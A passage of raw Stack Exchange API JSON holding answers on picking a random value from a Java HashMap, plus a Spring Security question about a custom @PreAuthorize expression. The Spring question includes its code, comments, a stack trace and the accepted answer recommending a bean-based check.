valToIdx.put(val, nums.size());\r\n            nums.add(val);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    /**\r\n     * Removes a value from the set. Returns true if the set contained the specified\r\n     * element.\r\n     */\r\n    public boolean remove(int val) {\r\n        if (valToIdx.containsKey(val)) {\r\n            int idx = valToIdx.get(val);\r\n            int lastVal = nums.get(nums.size() - 1);\r\n            \r\n            nums.set(idx, lastVal);\r\n            valToIdx.put(lastVal, idx);\r\n            \r\n            nums.remove(nums.size() - 1);\r\n            valToIdx.remove(val);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    /** Get a random element from the set. */\r\n    public int getRandom() {\r\n        return nums.get(rand.nextInt(nums.size()));\r\n    }\r\n}\r\n```\r\n\r\nThe idea comes from [this](https://leetcode.com/problems/insert-delete-getrandom-o1/) problem from [leetcode.com](https://leetcode.com).","title":"Is there a way to get the value of a HashMap randomly in Java?","body":"<p>If you are fine with <code>O(n)</code> time complexity you can use methods like <code>values()</code> or <code>values().toArray()</code> but if you look for a constant <code>O(1)</code> <code>getRandom()</code> operation one great alternative is to use a custom data structure. <code>ArrayList</code> and <code>HashMap</code> can be combined to attain <code>O(1)</code> time for <code>insert()</code>, <code>remove()</code> and <code>getRandom()</code>. Here is an example implementation:</p>\n\n<pre><code>class RandomizedSet {\n    List&lt;Integer&gt; nums = new ArrayList&lt;&gt;();\n    Map&lt;Integer, Integer&gt; valToIdx = new HashMap&lt;&gt;();\n    Random rand = new Random();\n\n    public RandomizedSet() { }\n\n    /**\n     * Inserts a value to the set. Returns true if the set did not already contain\n     * the specified element.\n     */\n    public boolean insert(int val) {\n        if (!valToIdx.containsKey(val)) {\n            valToIdx.put(val, nums.size());\n            nums.add(val);\n            return true;\n        }\n        return false;\n    }\n\n    /**\n     * Removes a value from the set. Returns true if the set contained the specified\n     * element.\n     */\n    public boolean remove(int val) {\n        if (valToIdx.containsKey(val)) {\n            int idx = valToIdx.get(val);\n            int lastVal = nums.get(nums.size() - 1);\n\n            nums.set(idx, lastVal);\n            valToIdx.put(lastVal, idx);\n\n            nums.remove(nums.size() - 1);\n            valToIdx.remove(val);\n            return true;\n        }\n        return false;\n    }\n\n    /** Get a random element from the set. */\n    public int getRandom() {\n        return nums.get(rand.nextInt(nums.size()));\n    }\n}\n</code></pre>\n\n<p>The idea comes from <a href=\"https://leetcode.com/problems/insert-delete-getrandom-o1/\" rel=\"nofollow noreferrer\">this</a> problem from <a href=\"https://leetcode.com\" rel=\"nofollow noreferrer\">leetcode.com</a>.</p>\n"},{"tags":[],"owner":{"account_id":8910445,"reputation":679,"user_id":6650896,"display_name":"Abbas Hosseini"},"down_vote_count":1,"up_vote_count":2,"is_accepted":false,"score":1,"last_activity_date":1605207126,"creation_date":1605207126,"answer_id":64810005,"question_id":929554,"body_markdown":"If you are using Java 8, `findAny` function in a pretty solution:\r\n```\r\nMyEntityClass myRandomlyPickedObject = myHashMap.values().stream().findAny();\r\n```","title":"Is there a way to get the value of a HashMap randomly in Java?","body":"<p>If you are using Java 8, <code>findAny</code> function in a pretty solution:</p>\n<pre><code>MyEntityClass myRandomlyPickedObject = myHashMap.values().stream().findAny();\n</code></pre>\n"},{"tags":[],"owner":{"account_id":193707,"reputation":34681,"user_id":435605,"accept_rate":45,"display_name":"AlikElzin-kilaka"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1639580764,"creation_date":1639580764,"answer_id":70365939,"question_id":929554,"body_markdown":"It seems that all other high voted answers iterate over all the elements. Here, at least, not all elements must be iterated over:\r\n\r\n    Random generator = new Random();\r\n    return myHashMap.values().stream()\r\n                    .skip(random.nextInt(myHashMap.size()))\r\n                    .findFirst().get();","title":"Is there a way to get the value of a HashMap randomly in Java?","body":"<p>It seems that all other high voted answers iterate over all the elements. Here, at least, not all elements must be iterated over:</p>\n<pre><code>Random generator = new Random();\nreturn myHashMap.values().stream()\n                .skip(random.nextInt(myHashMap.size()))\n                .findFirst().get();\n</code></pre>\n"}],"owner":{"account_id":39735,"reputation":1353,"user_id":114754,"accept_rate":57,"display_name":"Varuna"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":107378,"favorite_count":0,"down_vote_count":2,"up_vote_count":54,"accepted_answer_id":929574,"answer_count":14,"score":52,"last_activity_date":1639580764,"creation_date":1243681653,"question_id":929554,"body_markdown":"Is there a way to get the value of a HashMap randomly in Java?","title":"Is there a way to get the value of a HashMap randomly in Java?","body":"<p>Is there a way to get the value of a HashMap randomly in Java?</p>\n"},{"tags":["java","spring-boot","spring-security"],"comments":[{"owner":{"account_id":3192259,"reputation":117609,"user_id":2696260,"display_name":"M. Deinum"},"score":2,"creation_date":1639577548,"post_id":70364411,"comment_id":124384311,"body_markdown":"Apart from the fact you made this overly complex? You don&#39;t need a custom expression root or permission handler. Just create a bean with the `isAdmin` method and reference that in your expression `@yourbean.isAdmin`. Also your `isAdmin` takes a parameter, your expression you write doesn&#39;t provide that parameter `groupId` and as there is no `isAdmin()` method you get this error.","body":"Apart from the fact you made this overly complex? You don&#39;t need a custom expression root or permission handler. Just create a bean with the <code>isAdmin</code> method and reference that in your expression <code>@yourbean.isAdmin</code>. Also your <code>isAdmin</code> takes a parameter, your expression you write doesn&#39;t provide that parameter <code>groupId</code> and as there is no <code>isAdmin()</code> method you get this error."},{"owner":{"account_id":19814638,"reputation":434,"user_id":14512647,"display_name":"loc.dang"},"score":1,"creation_date":1639579225,"post_id":70364411,"comment_id":124385148,"body_markdown":"@M.Deinum I corrected the example `@PreAuthorize(&quot;isAdmin(#groupId)&quot;)` and i get error `ethod isAdmin(java.lang.Long) cannot be found on...`. I need to do that because I want to learn how to make custom security expression. I followed the [tutorial of baeldung](https://www.baeldung.com/spring-security-create-new-custom-security-expression)","body":"@M.Deinum I corrected the example <code>@PreAuthorize(&quot;isAdmin(#groupId)&quot;)</code> and i get error <code>ethod isAdmin(java.lang.Long) cannot be found on...</code>. I need to do that because I want to learn how to make custom security expression. I followed the <a href=\"https://www.baeldung.com/spring-security-create-new-custom-security-expression\" rel=\"nofollow noreferrer\">tutorial of baeldung</a>"},{"owner":{"account_id":3192259,"reputation":117609,"user_id":2696260,"display_name":"M. Deinum"},"score":1,"creation_date":1639580104,"post_id":70364411,"comment_id":124385501,"body_markdown":"No you don&#39;t need to do this. You can just create that method in a bean and do the exact same and use it as I stated. Which is far easier than creating a custom expression thing, which isn&#39;t even recommended anymore by the Spring Security Team.","body":"No you don&#39;t need to do this. You can just create that method in a bean and do the exact same and use it as I stated. Which is far easier than creating a custom expression thing, which isn&#39;t even recommended anymore by the Spring Security Team."},{"owner":{"account_id":19814638,"reputation":434,"user_id":14512647,"display_name":"loc.dang"},"score":0,"creation_date":1639580393,"post_id":70364411,"comment_id":124385651,"body_markdown":"I will follow your instructions. Thanks for the insight","body":"I will follow your instructions. Thanks for the insight"}],"answers":[{"tags":[],"owner":{"account_id":3192259,"reputation":117609,"user_id":2696260,"display_name":"M. Deinum"},"down_vote_count":0,"up_vote_count":12,"is_accepted":true,"score":12,"last_activity_date":1639580681,"creation_date":1639580681,"answer_id":70365925,"question_id":70364411,"body_markdown":"Generally don&#39;t use a custom `MethodSecurityExpressionOperations` instead just write a class which does what you want. Register that as a bean (make it an `@Component`) and reference that in your expression. \r\n\r\nSomething like the following \r\n\r\n```java\r\n@Component\r\npublic class OurSecurity {\r\n\r\n  public boolean isAdmin(Long groupId) {\r\n    log.debug(&quot;Group Id is {}&quot;, groupId);\r\n    return true;\r\n  }\r\n}\r\n```\r\n\r\nIf you setup Spring Boot correctly this will be picked up and registered as a bean. In SpEL you can reference a bean using the `@`. So rewrite your expression to the following. \r\n\r\n```java\r\n@PreAuthorize(&quot;@ourSecurity.isAdmin(#week)&quot;)\r\n```\r\n\r\nWhich will now call the method on the provided bean. You can now remove all the custom parts and just use this. This is easier than trying to replace the moving parts in Spring Security. \r\n\r\nYou can also use the same expression with the `access` method on the `HttpSecurity.antMatcher` (and other matches) to compose/write security expressions. ","title":"my Spring CustomSecurityExpressionRoot not working","body":"<p>Generally don't use a custom <code>MethodSecurityExpressionOperations</code> instead just write a class which does what you want. Register that as a bean (make it an <code>@Component</code>) and reference that in your expression.</p>\n<p>Something like the following</p>\n<pre class=\"lang-java prettyprint-override\"><code>@Component\npublic class OurSecurity {\n\n  public boolean isAdmin(Long groupId) {\n    log.debug(&quot;Group Id is {}&quot;, groupId);\n    return true;\n  }\n}\n</code></pre>\n<p>If you setup Spring Boot correctly this will be picked up and registered as a bean. In SpEL you can reference a bean using the <code>@</code>. So rewrite your expression to the following.</p>\n<pre class=\"lang-java prettyprint-override\"><code>@PreAuthorize(&quot;@ourSecurity.isAdmin(#week)&quot;)\n</code></pre>\n<p>Which will now call the method on the provided bean. You can now remove all the custom parts and just use this. This is easier than trying to replace the moving parts in Spring Security.</p>\n<p>You can also use the same expression with the <code>access</code> method on the <code>HttpSecurity.antMatcher</code> (and other matches) to compose/write security expressions.</p>\n"}],"owner":{"account_id":19814638,"reputation":434,"user_id":14512647,"display_name":"loc.dang"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":2273,"favorite_count":0,"down_vote_count":0,"up_vote_count":3,"accepted_answer_id":70365925,"answer_count":1,"score":3,"last_activity_date":1639580681,"creation_date":1639574351,"question_id":70364411,"body_markdown":"I created a New Security Expression in my spring project but it not working. Here is my code.\r\n\r\nFirstly, i make a `CustomPermissionEvaluator` which implement `PermissionEvaluator`:\r\n```Java\r\npublic class CustomPermissionEvaluator implements PermissionEvaluator {\r\n    @Override\r\n    public boolean hasPermission(Authentication auth, Object targetDomainObject, Object permission) {\r\n        if ((auth == null) || (targetDomainObject == null) || !(permission instanceof String)) {\r\n            return false;\r\n        }\r\n        final String targetType = targetDomainObject.getClass().getSimpleName().toUpperCase();\r\n        return hasPrivilege(auth, targetType, permission.toString().toUpperCase());\r\n    }\r\n\r\n    @Override\r\n    public boolean hasPermission(Authentication auth, Serializable targetId, String targetType, Object permission) {\r\n        if ((auth == null) || (targetType == null) || !(permission instanceof String)) {\r\n            return false;\r\n        }\r\n        return hasPrivilege(auth, targetType.toUpperCase(), permission.toString().toUpperCase());\r\n    }\r\n\r\n    private boolean hasPrivilege(Authentication auth, String targetType, String permission) {\r\n        for (final GrantedAuthority grantedAuth : auth.getAuthorities()) {\r\n            if (grantedAuth.getAuthority().startsWith(targetType) &amp;&amp; grantedAuth.getAuthority().contains(permission)) {\r\n                return true;\r\n            }\r\n        }\r\n        return false;\r\n    }\r\n}\r\n```\r\n\r\nAnd `CustomSecurityExpressionRoot` implement `MethodSecurityExpressionOperations`\r\n\r\n```Java\r\npublic class CustomSecurityExpressionRoot implements MethodSecurityExpressionOperations {\r\n\r\n    private final Logger log = LoggerFactory.getLogger(CustomSecurityExpressionRoot.class);\r\n\r\n    protected final Authentication authentication;\r\n    private AuthenticationTrustResolver trustResolver;\r\n    private RoleHierarchy roleHierarchy;\r\n    private Set&lt;String&gt; roles = new HashSet&lt;&gt;();\r\n    private String defaultRolePrefix = &quot;ROLE_&quot;;\r\n    private PermissionEvaluator permissionEvaluator;\r\n    private MyRepository myRepository;\r\n\r\n    private Object filterObject;\r\n    private Object returnObject;\r\n\r\n    public CustomSecurityExpressionRoot(Authentication authentication) {\r\n        if (authentication == null) {\r\n            throw new IllegalArgumentException(&quot;Authentication object cannot be null&quot;);\r\n        }\r\n        this.authentication = authentication;\r\n        log.debug(&quot;Custom Security Expression Root ran&quot;);\r\n    }\r\n\r\n    // @Override\r\n    // Override some method\r\n\r\n\r\n    // test\r\n    public boolean isAdmin(Long groupId){\r\n        log.debug(&quot;Group Id is {}&quot;, groupId);\r\n        return true;\r\n    }\r\n\r\n    public static &lt;T&gt; boolean allIsNull(T... items) {\r\n        for (T item : items) if (item != null) return false;\r\n        return true;\r\n    }\r\n\r\n}\r\n```\r\n\r\nAnd then, I create `CustomMethodSecurityExpressionHandler` which will `Override method createSecurityExpressionRoot`\r\n\r\n```Java\r\npublic class CustomMethodSecurityExpressionHandler extends DefaultMethodSecurityExpressionHandler {\r\n\r\n    private final AuthenticationTrustResolver trustResolver = new AuthenticationTrustResolverImpl();\r\n    private ApplicationContext applicationContext;\r\n\r\n    @Override\r\n    public void setApplicationContext(ApplicationContext applicationContext) {\r\n        super.setApplicationContext(applicationContext);\r\n        this.applicationContext = applicationContext;\r\n    }\r\n\r\n    @Override\r\n    protected MethodSecurityExpressionOperations createSecurityExpressionRoot(Authentication authentication, MethodInvocation invocation) {\r\n        CustomSecurityExpressionRoot root = new CustomSecurityExpressionRoot(authentication);\r\n        root.setPermissionEvaluator(getPermissionEvaluator());\r\n        root.setTrustResolver(this.trustResolver);\r\n        root.setRoleHierarchy(getRoleHierarchy());\r\n        root.setMyRepository(applicationContext.getBean(MyRepository.class));\r\n        return root;\r\n    }\r\n}\r\n```\r\n\r\nAnd finally, I configure the application\r\n\r\n```Java\r\n@Configuration\r\n@EnableGlobalMethodSecurity(prePostEnabled = true)\r\npublic class MethodSecurityConfig extends GlobalMethodSecurityConfiguration {\r\n\r\n    @Autowired\r\n    ApplicationContext applicationContext;\r\n\r\n    @Override\r\n    protected MethodSecurityExpressionHandler createExpressionHandler() {\r\n        CustomMethodSecurityExpressionHandler expressionHandler = new CustomMethodSecurityExpressionHandler();\r\n        expressionHandler.setPermissionEvaluator(new CustomPermissionEvaluator());\r\n        expressionHandler.setApplicationContext(applicationContext);\r\n        return expressionHandler;\r\n    }\r\n}\r\n```\r\n\r\nAnd I added `isAdmin()` restriction to 1 of my API\r\n\r\n```Java\r\n@RestController\r\n@RequestMapping(&quot;/api&quot;)\r\npublic class MyResource {\r\n\r\n    private final Logger log = LoggerFactory.getLogger(MyResource.class);\r\n\r\n    private static final String ENTITY_NAME = &quot;MyResource&quot;;\r\n\r\n    @Value(&quot;${jhipster.clientApp.name}&quot;)\r\n    private String applicationName;\r\n\r\n    private final MyService myService;\r\n\r\n    private final MyRepository myRepository;\r\n\r\n    private final MyKafkaService KafkaService;\r\n\r\n    public MyResource(GroupMemberService myService, MyRepository myRepository, MyKafkaService myKafkaService) {\r\n        this.myService = myService;\r\n        this.myRepository = myRepository;\r\n        this.KafkaService = KafkaService;\r\n    }\r\n    \r\n    @PreAuthorize(&quot;isAdmin(#week)&quot;)\r\n    @GetMapping(&quot;/todo/{week}&quot;)\r\n    public ResponseEntity&lt;List&lt;TodoDTO&gt;&gt; getAllTodoInWeek(@PathVariable Long week, Pageable pageable) {\r\n        log.debug(&quot;REST request to get a page of Todo&quot;);\r\n        Page&lt;TodoDTO&gt; page = myService.findAllByWeek(week, pageable);\r\n        HttpHeaders headers = PaginationUtil.generatePaginationHttpHeaders(ServletUriComponentsBuilder.fromCurrentRequest(), page);\r\n        return ResponseEntity.ok().headers(headers).body(page.getContent());\r\n    }\r\n}\r\n```\r\n\r\nI was excited to use postman to test this api and eagerly waiting for the desired result. But i get error `Caused by: org.springframework.expression.spel.SpelEvaluationException: EL1004E: Method call: Method isAdmin() cannot be found on type org.springframework.security.access.expression.method.MethodSecurityExpressionRoot`\r\n \r\n```Bash\r\njava.lang.IllegalArgumentException: Failed to evaluate expression &#39;isAdmin()&#39;\r\n\tat org.springframework.security.access.expression.ExpressionUtils.evaluateAsBoolean(ExpressionUtils.java:33)\r\n\tat org.springframework.security.access.expression.method.ExpressionBasedPreInvocationAdvice.before(ExpressionBasedPreInvocationAdvice.java:51)\r\n\tat org.springframework.security.access.prepost.PreInvocationAuthorizationAdviceVoter.vote(PreInvocationAuthorizationAdviceVoter.java:71)\r\n\tat org.springframework.security.access.prepost.PreInvocationAuthorizationAdviceVoter.vote(PreInvocationAuthorizationAdviceVoter.java:42)\r\n\tat org.springframework.security.access.vote.AffirmativeBased.decide(AffirmativeBased.java:60)\r\n\tat org.springframework.security.access.intercept.AbstractSecurityInterceptor.attemptAuthorization(AbstractSecurityInterceptor.java:238)\r\n\tat org.springframework.security.access.intercept.AbstractSecurityInterceptor.beforeInvocation(AbstractSecurityInterceptor.java:208)\r\n\tat org.springframework.security.access.intercept.aopalliance.MethodSecurityInterceptor.invoke(MethodSecurityInterceptor.java:58)\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186)\r\n\tat org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:753)\r\n\tat org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:97)\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186)\r\n\tat org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:753)\r\n\tat org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:698)\r\n\tat vn.vnedu.studyspace.group_store.web.rest.GroupMemberResource$$EnhancerBySpringCGLIB$$df9b89b9.getAllGroupMembersInGroup(&lt;generated&gt;)\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\r\n\tat java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n\tat java.base/java.lang.reflect.Method.invoke(Method.java:566)\r\n\tat org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205)\r\n\tat org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:150)\r\n\tat org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:117)\r\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895)\r\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808)\r\n\tat org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87)\r\n\tat org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1067)\r\n\tat org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963)\r\n\tat org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006)\r\n\tat org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898)\r\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:497)\r\n\tat org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883)\r\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:584)\r\n\tat io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74)\r\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129)\r\n\tat org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)\r\n\tat io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\r\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:327)\r\n\tat org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:115)\r\n\tat org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:81)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\r\n\tat org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:121)\r\n\tat org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:115)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\r\n\tat org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:126)\r\n\tat org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:81)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\r\n\tat org.springframework.security.oauth2.client.web.OAuth2AuthorizationCodeGrantFilter.doFilterInternal(OAuth2AuthorizationCodeGrantFilter.java:168)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\r\n\tat org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:105)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\r\n\tat org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:149)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\r\n\tat org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\r\n\tat org.springframework.security.oauth2.server.resource.web.BearerTokenAuthenticationFilter.doFilterInternal(BearerTokenAuthenticationFilter.java:137)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\r\n\tat org.springframework.security.oauth2.client.web.OAuth2AuthorizationRequestRedirectFilter.doFilterInternal(OAuth2AuthorizationRequestRedirectFilter.java:178)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\r\n\tat org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:103)\r\n\tat org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:89)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\r\n\tat org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90)\r\n\tat org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\r\n\tat org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:110)\r\n\tat org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:80)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\r\n\tat org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:55)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)\r\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336)\r\n\tat org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:211)\r\n\tat org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:183)\r\n\tat org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:358)\r\n\tat org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:271)\r\n\tat io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\r\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\r\n\tat org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)\r\n\tat io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\r\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\r\n\tat org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)\r\n\tat io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\r\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\r\n\tat org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:96)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)\r\n\tat io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\r\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\r\n\tat org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201)\r\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)\r\n\tat io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\r\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\r\n\tat io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84)\r\n\tat io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62)\r\n\tat io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68)\r\n\tat io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36)\r\n\tat io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68)\r\n\tat io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:117)\r\n\tat io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57)\r\n\tat io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43)\r\n\tat io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46)\r\n\tat io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64)\r\n\tat io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60)\r\n\tat io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77)\r\n\tat io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43)\r\n\tat io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43)\r\n\tat io.undertow.servlet.handlers.SendErrorPageHandler.handleRequest(SendErrorPageHandler.java:52)\r\n\tat io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43)\r\n\tat io.undertow.servlet.handlers.SessionRestoringHandler.handleRequest(SessionRestoringHandler.java:119)\r\n\tat io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:280)\r\n\tat io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:79)\r\n\tat io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:134)\r\n\tat io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:131)\r\n\tat io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48)\r\n\tat io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43)\r\n\tat io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:260)\r\n\tat io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:79)\r\n\tat io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:100)\r\n\tat io.undertow.server.Connectors.executeRootHandler(Connectors.java:387)\r\n\tat io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:852)\r\n\tat org.jboss.threads.ContextClassLoaderSavingRunnable.run(ContextClassLoaderSavingRunnable.java:35)\r\n\tat org.jboss.threads.EnhancedQueueExecutor.safeRun(EnhancedQueueExecutor.java:2019)\r\n\tat org.jboss.threads.EnhancedQueueExecutor$ThreadBody.doRunTask(EnhancedQueueExecutor.java:1558)\r\n\tat org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1449)\r\n\tat org.xnio.XnioWorker$WorkerThreadFactory$1$1.run(XnioWorker.java:1280)\r\n\tat java.base/java.lang.Thread.run(Thread.java:829)\r\nCaused by: org.springframework.expression.spel.SpelEvaluationException: EL1004E: Method call: Method isAdmin() cannot be found on type org.springframework.security.access.expression.method.MethodSecurityExpressionRoot\r\n\tat org.springframework.expression.spel.ast.MethodReference.findAccessorForMethod(MethodReference.java:226)\r\n\tat 